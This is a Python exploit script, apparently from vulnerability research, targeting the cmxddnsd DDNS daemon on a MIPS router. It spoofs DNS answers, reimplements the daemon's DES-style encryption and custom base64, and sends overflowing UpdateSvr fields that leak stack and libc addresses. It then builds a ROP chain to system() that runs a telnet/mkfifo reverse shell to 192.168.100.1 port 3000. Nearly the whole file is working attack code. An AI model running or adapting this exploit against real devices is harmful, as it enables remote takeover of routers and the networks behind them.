#! /usr/bin/env python3

from pwn import *

# S-boxes from memory dump starting at different locations

# S-box starting at 0x4186b0
SBOX_186b0 = [
    0x10001040, 0x00001000, 0x00040000, 0x10041040, 0x10000000, 0x10001040,
    0x00000040, 0x10000000, 0x00040040, 0x10040000, 0x10041040, 0x00041000,
    0x10041000, 0x00041040, 0x00001000, 0x00000040, 0x10040000, 0x10000040,
    0x10001000, 0x00001040, 0x00041000, 0x00040040, 0x10040040, 0x10041000,
    0x00001040, 0x00000000, 0x00000000, 0x10040040, 0x10000040, 0x10001000,
    0x00041040, 0x00040000, 0x00041040, 0x00040000, 0x10041000, 0x00001000,
    0x00000040, 0x10040040, 0x00001000, 0x00041040, 0x10001000, 0x00000040,
    0x10000040, 0x10040000, 0x10040040, 0x10000000, 0x00040000, 0x10001040,
    0x00000000, 0x10041040, 0x00040040, 0x10000040, 0x10040000, 0x10001000,
    0x10001040, 0x00000000, 0x10041040, 0x00041000, 0x00041000, 0x00001040,
    0x00001040, 0x00040040, 0x10000000, 0x10041000
]

# S-box starting at 0x4187b0
SBOX_187b0 = [
    0x00200000, 0x04200002, 0x04000802, 0x00000000, 0x00000800, 0x04000802,
    0x00200802, 0x04200800, 0x04200802, 0x00200000, 0x00000000, 0x04000002,
    0x00000002, 0x04000000, 0x04200002, 0x00000802, 0x04000800, 0x00200802,
    0x00200002, 0x04000800, 0x04000002, 0x04200000, 0x04200800, 0x00200002,
    0x04200000, 0x00000800, 0x00000802, 0x04200802, 0x00200800, 0x00000002,
    0x04000000, 0x00200800, 0x04000000, 0x00200800, 0x00200000, 0x04000802,
    0x04000802, 0x04200002, 0x04200002, 0x00000002, 0x00200002, 0x04000000,
    0x04000800, 0x00200000, 0x04200800, 0x00000802, 0x00200802, 0x04200800,
    0x00000802, 0x04000002, 0x04200802, 0x04200000, 0x00200800, 0x00000000,
    0x00000002, 0x04200802, 0x00000000, 0x00200802, 0x04200000, 0x00000800,
    0x04000002, 0x04000800, 0x00000800, 0x00200002
]

# S-box starting at 0x4188b0
SBOX_188b0 = [
    0x20000010, 0x20400000, 0x00004000, 0x20404010, 0x20400000, 0x00000010,
    0x20404010, 0x00400000, 0x20004000, 0x00404010, 0x00400000, 0x20000010,
    0x00400010, 0x20004000, 0x20000000, 0x00004010, 0x00000000, 0x00400010,
    0x20004010, 0x00004000, 0x00404000, 0x20004010, 0x00000010, 0x20400010,
    0x20400010, 0x00000000, 0x00404010, 0x20404000, 0x00004010, 0x00404000,
    0x20404000, 0x20000000, 0x20004000, 0x00000010, 0x20400010, 0x00404000,
    0x20404010, 0x00400000, 0x00004010, 0x20000010, 0x00400000, 0x20004000,
    0x20000000, 0x00004010, 0x20000010, 0x20404010, 0x00404000, 0x20400000,
    0x00404010, 0x20404000, 0x00000000, 0x20400010, 0x00000010, 0x00004000,
    0x20400000, 0x00404010, 0x00004000, 0x00400010, 0x20004010, 0x00000000,
    0x20404000, 0x20000000, 0x00400010, 0x20004010
]

# S-box starting at 0x4189b0
SBOX_189b0 = [
    0x00000100, 0x02080100, 0x02080000, 0x42000100, 0x00080000, 0x00000100,
    0x40000000, 0x02080000, 0x40080100, 0x00080000, 0x02000100, 0x40080100,
    0x42000100, 0x42080000, 0x00080100, 0x40000000, 0x02000000, 0x40080000,
    0x40080000, 0x00000000, 0x40000100, 0x42080100, 0x42080100, 0x02000100,
    0x42080000, 0x40000100, 0x00000000, 0x42000000, 0x02080100, 0x02000000,
    0x42000000, 0x00080100, 0x00080000, 0x42000100, 0x00000100, 0x02000000,
    0x40000000, 0x02080000, 0x42000100, 0x40080100, 0x02000100, 0x40000000,
    0x42080000, 0x02080100, 0x40080100, 0x00000100, 0x02000000, 0x42080000,
    0x42080100, 0x00080100, 0x42000000, 0x42080100, 0x02080000, 0x00000000,
    0x40080000, 0x42000000, 0x00080100, 0x02000100, 0x40000100, 0x00080000,
    0x00000000, 0x40080000, 0x02080100, 0x40000100
]

# S-box starting at 0x418ab0
SBOX_18ab0 = [
    0x00802001, 0x00002081, 0x00002081, 0x00000080, 0x00802080, 0x00800081,
    0x00800001, 0x00002001, 0x00000000, 0x00802000, 0x00802000, 0x00802081,
    0x00000081, 0x00000000, 0x00800080, 0x00800001, 0x00000001, 0x00002000,
    0x00800000, 0x00802001, 0x00000080, 0x00800000, 0x00002001, 0x00002080,
    0x00800081, 0x00000001, 0x00002080, 0x00800080, 0x00002000, 0x00802080,
    0x00802081, 0x00000081, 0x00800080, 0x00800001, 0x00802000, 0x00802081,
    0x00000081, 0x00000000, 0x00000000, 0x00802000, 0x00002080, 0x00800080,
    0x00800081, 0x00000001, 0x00802001, 0x00002081, 0x00002081, 0x00000080,
    0x00802081, 0x00000081, 0x00000001, 0x00002000, 0x00800001, 0x00002001,
    0x00802080, 0x00800081, 0x00002001, 0x00002080, 0x00800000, 0x00802001,
    0x00000080, 0x00800000, 0x00002000, 0x00802080
]

# S-box starting at 0x418bb0
SBOX_18bb0 = [
    0x00000208, 0x08020200, 0x00000000, 0x08020008, 0x08000200, 0x00000000,
    0x00020208, 0x08000200, 0x00020008, 0x08000008, 0x08000008, 0x00020000,
    0x08020208, 0x00020008, 0x08020000, 0x00000208, 0x08000000, 0x00000008,
    0x08020200, 0x00000200, 0x00020200, 0x08020000, 0x08020008, 0x00020208,
    0x08000208, 0x00020200, 0x00020000, 0x08000208, 0x00000008, 0x08020208,
    0x00000200, 0x08000000, 0x08020200, 0x08000000, 0x00020008, 0x00000208,
    0x00020000, 0x08020200, 0x08000200, 0x00000000, 0x00000200, 0x00020008,
    0x08020208, 0x08000200, 0x08000008, 0x00000200, 0x00000000, 0x08020008,
    0x08000208, 0x00020000, 0x08000000, 0x08020208, 0x00000008, 0x00020208,
    0x00020200, 0x08000008, 0x08020000, 0x08000208, 0x00000208, 0x08020000,
    0x00020208, 0x00000008, 0x08020008, 0x00020200
]

# S-box starting at 0x418cb0
SBOX_18cb0 = [
    0x80108020, 0x80008000, 0x00008000, 0x00108020, 0x00100000, 0x00000020,
    0x80100020, 0x80008020, 0x80000020, 0x80108020, 0x80108000, 0x80000000,
    0x80008000, 0x00100000, 0x00000020, 0x80100020, 0x00108000, 0x00100020,
    0x80008020, 0x00000000, 0x80000000, 0x00008000, 0x00108020, 0x80100000,
    0x00100020, 0x80000020, 0x00000000, 0x00108000, 0x00008020, 0x80108000,
    0x80100000, 0x00008020, 0x00000000, 0x00108020, 0x80100020, 0x00100000,
    0x80008020, 0x80100000, 0x80108000, 0x00008000, 0x80100000, 0x80008000,
    0x00000020, 0x80108020, 0x00108020, 0x00000020, 0x00008000, 0x80000000,
    0x00008020, 0x80108000, 0x00100000, 0x80000020, 0x00100020, 0x80008020,
    0x80000020, 0x00100020, 0x00108000, 0x00000000, 0x80008000, 0x00008020,
    0x80000000, 0x80100020, 0x80108020, 0x00108000
]

# S-box starting at 0x418db0
SBOX_18db0 = [
    0x01010400, 0x00000000, 0x00010000, 0x01010404, 0x01010004, 0x00010404,
    0x00000004, 0x00010000, 0x00000400, 0x01010400, 0x01010404, 0x00000400,
    0x01000404, 0x01010004, 0x01000000, 0x00000004, 0x00000404, 0x01000400,
    0x01000400, 0x00010400, 0x00010400, 0x01010000, 0x01010000, 0x01000404,
    0x00010004, 0x01000004, 0x01000004, 0x00010004, 0x00000000, 0x00000404,
    0x00010404, 0x01000000, 0x00010000, 0x01010404, 0x00000004, 0x01010000,
    0x01010400, 0x01000000, 0x01000000, 0x00000400, 0x01010004, 0x00010000,
    0x00010400, 0x01000004, 0x00000400, 0x00000004, 0x01000404, 0x00010404,
    0x01010404, 0x00010004, 0x01010000, 0x01000404, 0x01000004, 0x00000404,
    0x00010404, 0x01010400, 0x00000404, 0x01000400, 0x01000400, 0x00000000,
    0x00010004, 0x00010400, 0x00000000, 0x01010004
]


def encrypt_block(input_block):
   # Key array from memory dump at 0x4194a0 (subkey from key schedule)
   KEY_ARRAY = [
       0x28041816, 0x08103818, 0x3001251a, 0x27022b0a,
       0x0a1d0f1d, 0x0c000121, 0x10040621, 0x050b2e22,
       0x08051934, 0x18110e10, 0x01222a11, 0x1403121a,
       0x0c063b08, 0x32101d02, 0x07120519, 0x0001042e,
       0x02251434, 0x12000514, 0x00321202, 0x0629123c,
       0x34143822, 0x12001709, 0x103a0808, 0x0801213f,
       0x14002526, 0x1b063126, 0x0813012f, 0x08020031,
       0x1c001421, 0x04263a15, 0x01393809, 0x0920080f,
   ]

   left, right = input_block[0], input_block[1]
   temp = (left >> 4 ^ right) & 0x0F0F0F0F
   right ^= temp
   left ^= (temp << 4)
   temp = (left >> 16 ^ right) & 0xFFFF
   right ^= temp
   left ^= (temp << 16)
   temp = (right >> 2 ^ left) & 0x33333333
   left ^= temp
   right ^= (temp << 2)
   temp = (right >> 8 ^ left) & 0x00FF00FF
   left ^= temp
   right ^= (temp << 8)
   temp = ((right >> 31) | (right << 1)) & 0xFFFFFFFF
   right = (left^temp) & 0xAAAAAAAA
   left^= right
   right ^= temp
   temp = ((left >> 31) | (left << 1)) & 0xFFFFFFFF
   uvar1 = temp

   for i in range(0, len(KEY_ARRAY), 4):
       uvar4 = (((right << 28) | (right >> 4)) ^ KEY_ARRAY[i] ) & 0xFFFFFFFF
       left = (KEY_ARRAY[i + 1] ^ right) & 0xFFFFFFFF
       
       # S-box substitution
       sbox_output = (SBOX_18db0[((uvar4 >> 24) & 0x3F)] |
                     SBOX_189b0[((uvar4 >> 8) & 0x3F)] |
                     SBOX_187b0[(uvar4 & 0x3F)] |
                     SBOX_186b0[(left & 0x3F)] |
                     SBOX_18bb0[((uvar4 >> 16) & 0x3F)] |
                     SBOX_188b0[((left >> 8) & 0x3F)] |
                     SBOX_18ab0[((left >> 16) & 0x3F)] |
                     SBOX_18cb0[((left >> 24) & 0x3F)])
       
       uvar1 = uvar1 ^ sbox_output
       a = (((uvar1 << 0x1c | uvar1 >> 4)& 0xFFFFFFFF))
       b = KEY_ARRAY[i + 2]
       uvar4 = a^b
       left = KEY_ARRAY[i + 3] ^ uvar1
       
       # S-box substitution
       sbox_output = (SBOX_186b0[(left & 0x3F)] |
                     SBOX_188b0[((left >> 8) & 0x3F)] |
                     SBOX_187b0[(uvar4 & 0x3F)] |
                     SBOX_18ab0[((left >> 0x10 & 0x3F))] |
                     SBOX_18cb0[((left >> 0x18 & 0x3F))] |
                     SBOX_189b0[((uvar4 >> 8 & 0x3F))] |
                     SBOX_18bb0[((uvar4 >> 0x10 & 0x3F))] |
                     SBOX_18db0[((uvar4 >> 0x18 & 0x3F))])
       right ^= sbox_output


   uVar1 = uvar1

   right = (right << 0x1f | right >> 1) & 0xFFFFFFFF
   left = (uVar1 ^ right) & 0xaaaaaaaa
   right = right ^ left
   left = uVar1 << 0x1f | (uVar1 ^ left) >> 1
   uVar1 = (left >> 8 ^ right) & 0xff00ff
   right = right ^ uVar1
   left = uVar1 << 8 ^ left
   uVar1 = (left >> 2 ^ right) & 0x33333333
   right = right ^ uVar1
   left = uVar1 << 2 ^ left
   uVar1 = (right >> 0x10 ^ left) & 0xffff
   left = left ^ uVar1
   right = uVar1 << 0x10 ^ right
   uVar1 = (right >> 4 ^ left) & 0xf0f0f0f   
   input_block[0] = (right ^ (uVar1 << 4)) & 0xFFFFFFFF
   input_block[1] = (left ^ uVar1) & 0xFFFFFFFF
   return input_block


def convert_bytes_to_ints(input_bytes):
    return int.from_bytes(input_bytes[0:4], "big"), int.from_bytes(input_bytes[4:], "big")

def convert_ints_to_bytes(input_ints):
    """
    Convert two 32-bit integers into 8 bytes using little-endian byte ordering
    """
    result = [0] * 8
    result[0] = (input_ints[0] >> 24) & 0xFF  # MSB
    result[1] = (input_ints[0] >> 16) & 0xFF
    result[2] = (input_ints[0] >> 8) & 0xFF
    result[3] = input_ints[0] & 0xFF          # LSB
    result[4] = (input_ints[1] >> 24) & 0xFF  # MSB
    result[5] = (input_ints[1] >> 16) & 0xFF
    result[6] = (input_ints[1] >> 8) & 0xFF
    result[7] = input_ints[1] & 0xFF          # LSB
    return result


def encrypt_data(plaintext):
   # Pad input to multiple of 8 bytes
   padding_length = (8 - len(plaintext) % 8) % 8
   padded = plaintext + b'\x00' * padding_length
   
   # Process 8 bytes at a time
   encrypted = b''
   for i in range(0, len(padded), 8):
       block = padded[i:i+8]
       # Convert block to two integers
       ints = convert_bytes_to_ints(block)
       # Encrypt block
       encrypted_ints = encrypt_block(list(ints))
       # Convert back to bytes
       encrypted += bytes(convert_ints_to_bytes(encrypted_ints))
   
   # Base64 encode result    
   import base64
   b64 = base64.b64encode(encrypted).decode()
   # Translate from default base64 to custom
   b64_alphabet="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
   cus_alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789*_"
   encoded = str.maketrans(b64_alphabet, cus_alphabet)
   return b64.translate(encoded)





from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP
from scapy.all import *
from scapy import *

iface = "br0"   # Or your default interface

filter = f"udp port 53 or udp port 9994"
ddns_server_ip = "192.168.100.123"

LEAK = 0
NEXT_DEST = 0
DNS_PACKET_ID = 0    ##### as the program stores ID on global , w should use the last PACKET ID +1 for LIBC LEAK as we cahnge pointed buffer
LEAK_LIBC = 0
FIRST_SEND = 0

LIBC_BASE = 0
def dns_response(pkt: IP):
    global LEAK 
    global NEXT_DEST
    global DNS_PACKET_ID
    global LEAK_LIBC
    global FIRST_SEND
    global LIBC_BASE
    '''print(pkt[IP])
    print(pkt.getlayer('IP').dst)
    print(pkt.sprintf('%IP.dst%'))'''
    #pkt.show()
    if (
        pkt.haslayer(DNS) and 
        pkt.haslayer(DNSQR) and 
        ("Dns1.comexe.net" in pkt[DNSQR].qname.decode() or "Dns1.comexe.cn" in pkt[DNSQR].qname.decode())  and
        pkt[DNS].qr == 0 and     # This is a query (not response)
        pkt[UDP].dport == 53     # so it will not respond on it's own packet sent
        #FIRST_SEND%2== 0
    ):
        if ("Dns1.comexe.net" in pkt[DNSQR].qname.decode()):
            ''' 
                Wireshark the IP are the 4 last byte 
                    00038180000100010000000004446e733106636f6d657865036e65740000010001c00c0001000100000e10000479c941ad
                    0000   00 03 81 80 00 01 00 01 00 00 00 00 04 44 6e 73   .............Dns
                    0010   31 06 63 6f 6d 65 78 65 03 6e 65 74 00 00 01 00   1.comexe.net....
                    0020   01 c0 0c 00 01 00 01 00 00 0e 10 00 04 79 c9 41   .............y.A
                    0030   ad                                                .
            '''
            '''dns_layer = (
                b'\x00\x03\x81\x80'      # Header: ID + Flags
                b'\x00\x01\x00\x01'      # QDCOUNT=1, ANCOUNT=1
                b'\x00\x00\x00\x00'      # NSCOUNT=0, ARCOUNT=0
                b'\x04Dns1'              # First label length + "Dns1"
                b'\x06comexe'            # Second label length + "comexe"
                b'\x03net\x00'           # Third label length + "net" + terminator
                b'\x00\x01\x00\x01'      # QTYPE=1(A), QCLASS=1(IN)
                b'\xc0\x0c'              # Compression pointer to name
                b'\x00\x01\x00\x01'      # TYPE=1(A), CLASS=1(IN)
                b'\x00\x00\x0e\x10'      # TTL
                b'\x00\x04'              # RDLENGTH=4
                b'\xc0\xa8\x64\x01'      # RDATA (IP address)   ##  c0.a8.64.01 (0xc0a86401) == 192.168.100.1
            )'''
            
            # Create DNS response layer // compressed packet because the original use dns packet compression
            dns_resp = DNS(
                id=pkt[DNS].id,  # Use the same ID from request
                qr=1,       # This is a response
                opcode=0,   # Standard query
                aa=0,       # Not authoritative
                tc=0,       # Not truncated
                rd=1,       # Recursion desired
                ra=1,       # Recursion available
                z=0,        # Reserved
                ad=0,       # Not authenticated
                cd=0,       # Non-authenticated data okay
                rcode=0,    # No error
                qd=pkt[DNS].qd,  # Original question
                an=DNSRR(
                    rrname=pkt[DNSQR].qname,  # Domain name from query
                    type='A',
                    ttl=3600,  # Time to live: 1 hour
                    rdata='192.168.100.5'  # Response IP address
                ),
                nscount=0,
                arcount=0
            ).compress()

            # Create and send response
            dns_response_pkt = IP(dst=pkt[IP].src, src=pkt.getlayer('IP').dst)/\
                        UDP(dport=pkt[UDP].sport, sport=53)/\
                        dns_resp
            '''The send() function will send packets at layer 3. That is to say, it will handle routing and layer 2 for you. 
            The sendp() function will work at layer 2. It's up to you to choose the right interface and the right link layer protocol.'''
            send(dns_response_pkt)
        elif "Dns1.comexe.cn" in pkt[DNSQR].qname.decode():
            '''dns_layer = (
                b'\x00\x03\x81\x80'      # Header: ID + Flags
                b'\x00\x01\x00\x01'      # QDCOUNT=1, ANCOUNT=1
                b'\x00\x00\x00\x00'      # NSCOUNT=0, ARCOUNT=0
                b'\x04Dns1'              # First label length + "Dns1"
                b'\x06comexe'            # Second label length + "comexe"
                b'\x02cn\x00'           # Third label length + "cn" + terminator
                b'\x00\x01\x00\x01'      # QTYPE=1(A), QCLASS=1(IN)
                b'\xc0\x0c'              # Compression pointer to name
                b'\x00\x01\x00\x01'      # TYPE=1(A), CLASS=1(IN)
                b'\x00\x00\x0e\x10'      # TTL
                b'\x00\x04'              # RDLENGTH=4
                b'\xc0\xa8\x64\x05'      # RDATA (IP address)   ##  c0.a8.64.01 (0xc0a86401) == 192.168.100.1
            )'''

            DNS_PACKET_ID = pkt[DNS].id ## Save id for future use

            # Create DNS response layer
            dns_resp = DNS(
                id=pkt[DNS].id,  # Use the same ID from request
                qr=1,       # This is a response
                opcode=0,   # Standard query
                aa=0,       # Not authoritative
                tc=0,       # Not truncated
                rd=1,       # Recursion desired
                ra=1,       # Recursion available
                z=0,        # Reserved
                ad=0,       # Not authenticated
                cd=0,       # Non-authenticated data okay
                rcode=0,    # No error
                qd=pkt[DNS].qd,  # Original question
                an=DNSRR(
                    rrname=pkt[DNSQR].qname,  # Domain name from query
                    type='A',
                    ttl=3600,  # Time to live: 1 hour
                    rdata='192.168.100.1'  # Response IP address
                ),
                nscount=0,
                arcount=0
            ).compress()

            # Create and send response
            dns_response_pkt = IP(dst=pkt[IP].src, src=pkt.getlayer('IP').dst)/\
                        UDP(dport=pkt[UDP].sport, sport=53)/\
                        dns_resp
            
            '''The send() function will send packets at layer 3. That is to say, it will handle routing and layer 2 for you. 
            The sendp() function will work at layer 2. It's up to you to choose the right interface and the right link layer protocol.'''
            send(dns_response_pkt)
            FIRST_SEND += 1


    elif pkt.dport == 9994:
        #### \x01OK=N\x01MSG=\x01ErrorCode=7\x01UpdateSvr1=AAAAAAAAAAAAAAAAAAA\x01UpdateSvr2=BBBBBBBBBBBBBBBBBBBB\x01   == end with \x01
        '''
            gef> vmmap
            [ Legend: Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
            Start      End        Size       Offset     Perm Path
            0x00400000 0x00409000 0x00009000 0x00000000 r-x /usr/sbin/cmxddnsd  <-  $a0, $a1, $s3, $ra, $bad, $pc
            0x00418000 0x0041a000 0x00002000 0x00008000 rw- /usr/sbin/cmxddnsd  <-  $t8
            0x0041a000 0x0041c000 0x00002000 0x00000000 rwx [heap]
            0x77de0000 0x77df9000 0x00019000 0x00000000 r-x /lib/libeasylogger.so
            0x77df9000 0x77dfa000 0x00001000 0x00009000 rw- /lib/libeasylogger.so
            0x77dfa000 0x77dff000 0x00005000 0x00000000 rw-
            0x77dff000 0x77ee6000 0x000e7000 0x00000000 r-x /usr/lib/libiconv.so.2.4.0
            0x77ee6000 0x77ee7000 0x00001000 0x000d7000 rw- /usr/lib/libiconv.so.2.4.0
            0x77ee7000 0x77f09000 0x00022000 0x00000000 r-x /lib/libgcc_s.so.1
            0x77f09000 0x77f0a000 0x00001000 0x00012000 rw- /lib/libgcc_s.so.1
            0x77f0a000 0x77f1c000 0x00012000 0x00000000 r-x /lib/libcomm.so
            0x77f1c000 0x77f1d000 0x00001000 0x00002000 rw- /lib/libcomm.so
            0x77f1d000 0x77f32000 0x00015000 0x00000000 r-x /lib/libubox.so
            0x77f32000 0x77f33000 0x00001000 0x00005000 rw- /lib/libubox.so
            0x77f33000 0x77f49000 0x00016000 0x00000000 r-x /lib/libuci.so
            0x77f49000 0x77f4a000 0x00001000 0x00006000 rw- /lib/libuci.so
            0x77f4a000 0x77f5a000 0x00010000 0x00000000 r-x /usr/lib/liblogger.so
            0x77f5a000 0x77f5b000 0x00001000 0x00000000 rw- /usr/lib/liblogger.so
            0x77f5b000 0x77fed000 0x00092000 0x00000000 r-x /lib/libc.so  <-  $t9
            0x77ffc000 0x77ffe000 0x00002000 0x00091000 rw- /lib/libc.so
            0x77ffe000 0x78000000 0x00002000 0x00000000 rwx  <-  $s6, $s7
            0x7ffde000 0x7ffff000 0x00021000 0x00000000 rw- [stack]  <-  $v0, $t2, $s0, $s1, $sp
            0x7ffff000 0x80000000 0x00001000 0x00000000 r-x [vdso]
        '''

        '''#trigger 
        updateSrv1 = b"A"*(0x80)
        updateSrv2 = b"B"*(0x80-1)
        data = b'\x01OK=N\x01MSG=\x01ErrorCode=7\x01'
        data += b'UpdateSvr1=' + updateSrv1 + b'\x01'
        data += b'UpdateSvr2=' + updateSrv2 + b'\x01'
        payload = b"\x01C=2\x01Data=" + encrypt_data(data).encode() + b"\x01EnType=2\x01"'''
        print(LEAK)
        if LEAK == 0 and (FIRST_SEND%2) == 1:
            #### LEAKING PART
            # handle (buffer is of size 259)
            updateSrv1 = b"A"*(0x80)
            updateSrv2 = b"B"*(0x80)
            updateSrv2 += b'C'*(259-len(updateSrv2) -len(updateSrv1))
            ## sock addr local34 size 0x10, we will choose addr in data section 0x0041a000-0x50 for exemple (free space)
            ## will be populated later so, anything
            updateSrv2 += b'D'*0x10
            ## local_24, will be populated later too and seems not in use so anything with alignment so 4 bytes
            updateSrv2 += b'E'*0x3 # use 0x3 ==> IP = 1.0.1.0
            # size_t local_20 0x4 size
            updateSrv2 += p32(0x02020202) + b'\x2f' 
            # local_1c is DNS server addr by default it is 0x08080808
            #updateSrv2 += b'\x09'*4
            # next_dest
            #updateSrv2 += b'\x30' + b'\x2f'
            data = b'\x01OK=N\x01MSG=\x01ErrorCode=7\x01'
            data += b'UpdateSvr1=' + updateSrv1 + b'\x01'
            data += b'UpdateSvr2=' + updateSrv2 + b'\x01'

            payload = b"\x01C=2\x01Data=" + encrypt_data(data).encode() + b"\x01EnType=2\x01"

            response_pkt = IP(dst=pkt[IP].src, src=pkt.getlayer('IP').dst)/\
                                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                                payload
            LEAK = 0
            if pkt[IP].dst == "192.168.100.5":
                pass
            elif pkt[IP].dst == "192.168.100.1":
                send(response_pkt)
        
        
            
        elif (FIRST_SEND%2) == 1 and LEAK_LIBC == 1:
            LEAK_LIBC = 3
            #### Try RCE Here now we have everything
            updateSrv1 = b"K"*(0x80)
            updateSrv2 = b"L"*(0x80) 
            updateSrv2 += b'M'*(259-len(updateSrv2) -len(updateSrv1))
            ## sock addr local34 size 0x10, we will choose addr in data section 0x0041a000-0x50 for exemple (free space)
            ## will be populated later so, anything
            updateSrv2 += b'N'*0x10
            ## local_24, will be populated later too and seems not in use so anything with alignment so 4 bytes
            updateSrv2 += b'O'*0x4 # use 0x3 ==> IP = 1.0.1.0
            # size_t local_20 0x4 size
            updateSrv2 += p32(0x02020202)
            # local_1c is DNS server addr by default it is 0x08080808
            updateSrv2 += b'\x09'*3     ### normally µ4 but 5 to consume the write from next_dest, let's use 9.9.9.9 to continue
            # next_dest
            '''updateSrv2 += p32(NEXT_DEST+1) 
            # pointer local_20 should be a valid pointer without null byte
            updateSrv2 += p32(NEXT_DEST)'''
            # next payload overwrite ra etc

            '''updateSrv2 += b'AAAA'
            updateSrv2 += b'BBBB' #s0  we control    
            updateSrv2 += b'CCCC' # s1
            updateSrv2 += b'DDDD'  ## first ra'''
            updateSrv2 += b'\x2f' # end bytes

            data = b'\x01OK=N\x01MSG=\x01ErrorCode=7\x01'
            data += b'UpdateSvr1=' + updateSrv1 + b'\x01'
            data += b'UpdateSvr2=' + updateSrv2 + b'\x01'

            payload = b"\x01C=2\x01Data=" + encrypt_data(data).encode() + b"\x01EnType=2\x01"

            response_pkt = IP(dst=pkt[IP].src, src=pkt.getlayer('IP').dst)/\
                                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                                payload
            LEAK = 0
            if pkt[IP].dst == "192.168.100.5":
                pass
            elif pkt[IP].dst == "192.168.100.1":
                send(response_pkt)



        elif LEAK == 1:
            print("FIRST SEND")
            print(FIRST_SEND)
            #### POSSIBLE LIBC LEAK 
            updateSrv1 = b"Z"
            updateSrv2 = b"Y"*(0x80) + b"X"*(0x80)
            updateSrv2 += b'W'*(259-len(updateSrv2) -len(updateSrv1))
            ## sock addr local34 size 0x10, we will choose addr in data section 0x0041a000-0x50 for exemple (free space)
            ## will be populated later so, anything
            updateSrv2 += b'V'*0x10
            ## local_24, will be populated later too and seems not in use so anything with alignment so 4 bytes
            updateSrv2 += b'U'*0x4 # use 0x3 ==> IP = 1.0.1.0
            # size_t local_20 0x4 size
            updateSrv2 += p32(0x02020202)
            # local_1c is DNS server addr by default it is 0x08080808
            updateSrv2 += b'\x09'*5     ### normally µ4 but 5 to consume the write from next_dest, let's use 9.9.9.9 to continue
            # next_dest
            updateSrv2 += p32(NEXT_DEST+1) 
            # pointer local_20 should be a valid pointer without null byte, we will use GOT and as no null bytes the \x2f will end and null will be wrote
            addt_to_leak = 0x418568
            updateSrv2 += addt_to_leak.to_bytes(3, 'little')
            updateSrv2 += b'\x2f' # end bytes

            

            data = b'\x01OK=N\x01MSG=\x01ErrorCode=7\x01'
            data += b'UpdateSvr1=' + updateSrv1 + b'\x01'
            data += b'UpdateSvr2=' + updateSrv2 + b'\x01'

            payload = b"\x01C=2\x01Data=" + encrypt_data(data).encode() + b"\x01EnType=2\x01"

            response_pkt = IP(dst=pkt[IP].src, src=pkt.getlayer('IP').dst)/\
                                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                                payload
            if pkt[IP].dst == "192.168.100.5":
                pass
            elif pkt[IP].dst == "192.168.100.1":
                send(response_pkt)

        elif LEAK_LIBC == 3:
            #### POSSIBLE LIBC LEAK 
            #updateSrv1 = b"sh -c 'telnet 0xc0a86401 3000 | sh | telnet 0xc0a86401 3001'; "   # hex IP beceause ///// 
                                                                # mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
            updateSrv1 = b"sh -c 'TF=$(mktemp -u); mkfifo $TF && telnet 0xc0a86401 3000 0<$TF | sh 1>$TF'; "
            updateSrv1 += b"####"
            updateSrv1 += b"Q" * (0x80 -len(updateSrv1))
            updateSrv2 = b"R"*(0x80)
            updateSrv2 += b'W'*(259-len(updateSrv2) -len(updateSrv1))
            ## sock addr local34 size 0x10, we will choose addr in data section 0x0041a000-0x50 for exemple (free space)
            ## will be populated later so, anything
            updateSrv2 += b'V'*0x10
            ## local_24, will be populated later too and seems not in use so anything with alignment so 4 bytes
            updateSrv2 += b'U'*0x4 # use 0x3 ==> IP = 1.0.1.0
            # size_t local_20 0x4 size
            updateSrv2 += p32(0x02020202)
            # local_1c is DNS server addr by default it is 0x08080808
            updateSrv2 += b'\x11'*4     ### Here * 4 don't really know why it behave like that  // found after debugging // Ah may be because here we are using all UpdateSrv1 value
            # next_dest
            updateSrv2 += p32(NEXT_DEST+1) 
            # pointer local_20 should be a valid pointer without null byte, we will use GOT and as no null bytes the \x2f will end and null will be wrote
            updateSrv2 += p32(NEXT_DEST)
            # next payload overwrite ra etc
            mapping_ghidra_addr = 0x10000
            system = LIBC_BASE + (0x6a468 - mapping_ghidra_addr)
            gadget_mis = LIBC_BASE + 0x0002854c
            command_pointer = 0x0041901c+0x80+0x80          # will point on the start of updateSrv1;
            # Inverser gadget 3 et
            
           
            updateSrv2 += b'FFFF'    ##### 
            updateSrv2 += command_pointer.to_bytes(3, 'little') + b'.'  #s0   a0 will be popped by the value in s0, as the command_pointer coming from bss which has null bytes as MSB we will use '.' to jump over so that the program will keep the old null wroted there
                                                                ### here integer_val.to_bytes(2, 'big')
            updateSrv2 += b'S1S1' # s1  # under control
            updateSrv2 += p32(gadget_mis)  # first ta
            updateSrv2 += b'DDDD'  #  next
            updateSrv2 += b'DDDD'  #  next
            updateSrv2 += b'DDDD'  #  next
            updateSrv2 += b'DDDD'  #  next
            updateSrv2 += b'HHHH'  # here is gp will be derefenrec when call system so should be valid addr 
            updateSrv2 += b'EEEE'  #  system strings;; after many test i things that the system don't want anything in stack i don't know why 
                                                  #| i tried to align the pointer to 8 bytes or 4 bytes but no way , but address in global var work
                                                  # and unfortunately for us our value is on bss before recopy on stack so we will point it there
                                                  # but i can't use it because you know NULL BYTEEES
            updateSrv2 += b'GGGG'  #  next  next gadget t9 after controlling gp     gadget - 0x771c, will contain stack  <--|
            updateSrv2 += p32(system)    # next ta 0x1c will next gadget
            updateSrv2 += b'\x2f' # end bytes   ### NULL bytes casse tout

            data = b'\x01OK=N\x01MSG=\x01ErrorCode=7\x01'
            data += b'UpdateSvr1=' + updateSrv1 + b'\x01'
            data += b'UpdateSvr2=' + updateSrv2 + b'\x01'

            payload = b"\x01C=2\x01Data=" + encrypt_data(data).encode() + b"\x01EnType=2\x01"

            response_pkt = IP(dst=pkt[IP].src, src=pkt.getlayer('IP').dst)/\
                                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                                payload
            if pkt[IP].dst == "192.168.100.5":
                pass
            elif pkt[IP].dst == "192.168.100.1":
                send(response_pkt)


    elif pkt[IP].dst == "1.0.1.0":
        ####### the Leak 
        stack_offset = 0x12c
        stack_addr = raw(pkt[DNS])[stack_offset: stack_offset+4]
        #log.info ("Stack")
        print("STACK LEAK")
        print(hex(u32(stack_addr)))
